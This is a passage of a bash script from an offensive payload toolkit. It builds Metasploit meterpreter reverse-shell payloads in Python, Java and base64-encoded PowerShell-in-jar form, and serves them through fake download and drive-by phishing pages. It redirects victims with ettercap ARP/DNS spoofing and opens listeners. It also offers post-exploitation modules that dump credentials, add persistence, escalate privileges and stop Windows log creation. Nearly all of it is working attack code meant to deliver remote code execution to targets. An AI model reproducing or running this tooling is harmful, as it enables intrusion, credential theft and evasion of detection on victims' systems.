serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.py\n\nExecute: python $N4m.py\n\nchose how to deliver: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2


   else


# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" --width 305 --height 370) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi



if [ "$P0" = "dump_credentials_linux.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
    echo "[✔] wifi_dump_linux.rb -> found"
    sleep 2
  else
    echo "[x] wifi_dump_linux.rb -> not found"
    sleep 1
    echo "    copy post-module to msfdb .."
    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi



if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi



      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.py|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.py $ApAcHe/$N4m.py > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.py $ApAcHe/$N4m.py
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.py > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_multi_menu
  clear
fi
}





# ------------------------------------------------------
# drive-by attack vector JAVA payload.jar
# i have allways dream about this (drive-by-rce)
# using JAVA (affects all operative systems with python)
# -------------------------------------------------------
sh_shellcode18 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ JAR NAME ☠" --text "example: JavaPayload" --entry --width 300) > /dev/null 2>&1
# CHOSE WHAT PAYLOAD TO USE
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\n\nAvailable payloads:" --radiolist --column "Pick" --column "Option" TRUE "java/meterpreter/reverse_tcp (default)" FALSE "windows/meterpreter/reverse_tcp (base64)" --width 380 --height 200) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="JavaPayload";fi

if [ "$serv" = "java/meterpreter/reverse_tcp (default)" ]; then
echo "[☠] Building shellcode -> java format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : JAVA -> MULTI OS
    |_PAYLOAD : java/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f java > $IPATH/output/$N4m.jar"
# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] building raw shellcode..."
sleep 2
echo "[☠] Injecting shellcode -> $N4m.jar!"
sleep 2

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.jar\n\nchose how to deliver: $N4m.jar" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 240) > /dev/null 2>&1



   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
       fi


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" --width 305 --height 390) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


if [ "$P0" = "dump_credentials_linux.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
    echo "[✔] wifi_dump_linux.rb -> found"
    sleep 2
  else
    echo "[x] wifi_dump_linux.rb -> not found"
    sleep 1
    echo "    copy post-module to msfdb .."
    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc13 driveBy[bak].html
      sed "s|NaM3|http://$lhost:$lport|g" driveBy.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.jar $ApAcHe/$N4m.jar > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.jar $ApAcHe/$N4m.jar
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.jar > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
clear
cd $IPATH/



# ------------------------
# build base64 jar payload
# ------------------------
elif [ "$serv" = "windows/meterpreter/reverse_tcp (base64)" ]; then
echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PSH-CMD -> WINDOWS
    |_PAYLOAD : windows/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"


# display shellcode
echo ""
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $str0
echo ""

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $IPATH/templates/exec.jar $IPATH/templates/exec[bak].jar
sleep 2
echo "[☠] Injecting shellcode -> $N4m.jar!"
sleep 2
cd $IPATH/templates
sed "s|InJ3C|$str0|" exec.jar > $N4m.jar
mv $N4m.jar $IPATH/output/$N4m.jar


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.jar\n\nchose how to deliver: $N4m.jar" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 240) > /dev/null 2>&1



   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
       fi


   else


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc13 driveBy[bak].html
      sed "s|NaM3|http://$lhost:$lport|g" driveBy.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.jar $ApAcHe/$N4m.jar > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
      echo "- THIS ATTACK VECTOR WILL TRIGGER PAYLOAD RCE"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.jar $ApAcHe/$N4m.jar
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi

# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
rm $ApAcHe/$N4m.jar > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
mv $IPATH/templates/exec[bak].jar $InJEc16 > /dev/null 2>&1
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
clear
cd $IPATH/



else
# CLEANING EVERYTHING UP
echo "[☠] Cancel button pressed, aborting..."
sleep 2
sh_multi_menu
fi
}






# ---------------------------------------------------------
# WEB_DELIVERY PYTHON/PSH PAYLOADS (msfvenom web_delivery)
# loading from msfconsole the amazing web_delivery module
# writen by: 'Andrew Smith' 'Ben Campbell' 'Chris Campbell'
# this as nothing to do with shellcode, but i LOVE this :D
# ---------------------------------------------------------
sh_shellcode19 () {
# get user input to build the payload
echo "[☆] Enter shellcode settings!"
srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
# CHOSE WHAT PAYLOAD TO USE
PuLK=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Available payloads:" --radiolist --column "Pick" --column "Option" TRUE "python" FALSE "powershell" --width 305 --height 180) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$srvhost" ]; then srvhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$PuLK" ]; then PuLK="python";fi


   if [ "$PuLK" = "python" ]; then
   echo "[☠] Building shellcode -> $PuLK format ..."
   sleep 2
   tagett="0"
   filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload" --entry --width 300) > /dev/null 2>&1

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | URIPATH : /SecPatch
    | SRVHOST : $srvhost
    | FORMAT  : PYTHON -> MULTI OS
    | PAYLOAD : python/meterpreter/reverse_tcp
    |_STORED  : $IPATH/output/$filename.py

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $IPATH/templates/web_delivery.py $IPATH/templates/web_delivery[bak].py


   # check if exec.ps1 exists
   if [ -e $IPATH/templates/web_delivery.py ]; then
      echo "[☠] web_delivery.py -> found!"
      sleep 2
 
   else

      echo "[☠] web_delivery.py -> not found!"
      exit
   fi


# edit/backup files nedded
cd $IPATH/templates/
echo "[☠] building -> $filename.py"
